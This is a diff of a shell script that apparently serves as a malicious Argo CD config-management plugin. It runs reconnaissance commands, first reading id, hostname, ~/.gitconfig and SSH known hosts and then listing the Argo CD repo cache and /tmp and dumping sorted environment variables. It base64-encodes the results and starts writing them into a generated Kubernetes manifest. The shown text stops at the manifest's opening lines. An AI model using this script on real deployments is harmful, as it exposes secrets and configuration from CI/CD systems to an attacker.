@@ -1,17 +1,17 @@
 #!/bin/sh
 RECON=$( (
-echo "===WHOAMI==="
-id
-echo "===HOSTNAME==="
-hostname
-echo "===PWD==="
+echo "===CWD==="
 pwd
-echo "===REPO_CACHE==="
-ls /tmp/_argocd-repo/ 2>/dev/null | head
-echo "===GIT_CONFIG==="
-cat ~/.gitconfig 2>/dev/null
-echo "===KNOWN_HOSTS==="
-head /app/config/ssh/ssh_known_hosts 2>/dev/null
+echo "===ARG==="
+echo "args: $@"
+echo "===LS_CWD==="
+ls -la
+echo "===REPO_HASH_DIR==="
+ls -la /tmp/_argocd-repo/ 2>/dev/null
+echo "===TMP==="
+ls -la /tmp/ 2>/dev/null | head -20
+echo "===ENV==="
+env | sort | head -30
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
